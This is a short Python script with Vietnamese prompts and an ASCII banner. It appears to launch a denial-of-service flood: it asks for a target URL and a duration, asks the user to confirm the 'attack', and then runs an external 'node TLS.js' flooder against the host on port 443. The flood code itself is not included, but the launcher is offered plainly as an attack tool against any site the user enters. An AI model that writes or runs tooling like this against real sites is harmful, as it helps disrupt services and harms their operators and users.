import os
from os import name, system
if name == 'nt':
    system("title Đậu Đậu - HTTP2 Tunnel")
    system("mode 101, 25")
os.system("cls" if os.name == "nt" else "clear")
panel = """
  ________  __         ______             __                                                       
 /        |/  |       /      \           /  |                                                 
 $$$$$$$$/ $$ |      /$$$$$$  |         _$$ |_    __    __  _______   _______    ______    ______  
    $$ |   $$ |      $$ \__$$/  ______ / $$   |  /  |  /  |/       \ /       \  /      \  /      \ 
    $$ |   $$ |      $$      \ /      |$$$$$$/   $$ |  $$ |$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
    $$ |   $$ |       $$$$$$  |$$$$$$/   $$ | __ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
    $$ |   $$ |_____ /  \__$$ |          $$ |/  |$$ \__$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$/ $$ |      
    $$ |   $$       |$$    $$/           $$  $$/ $$    $$/ $$ |  $$ |$$ |  $$ |$$       |$$ |      
    $$/    $$$$$$$$/  $$$$$$/             $$$$/   $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$$/ $$/       
"""
print(panel)
host=input("       [+] Nhập URL Taget: ")
time=int(input("       [+] Nhập Time (s): "))
print("  =========================================================================")
input('       Vui lòng xác nhận attack (Enter)')
os.system("cls" if os.name == "nt" else "clear")
print()
print("  =========================================================================")
print("       Mục tiêu               =     {}".format(host))
print("       Thời gian              =     {} giây".format(time))
print("       Methoads (default)     =     GET")
print("       Cổng (default)         =     443")
print("  =========================================================================")
os.system(f"node TLS.js {host} {time}")
print("  =========================================================================")
input('       ấn Enter để thoát')
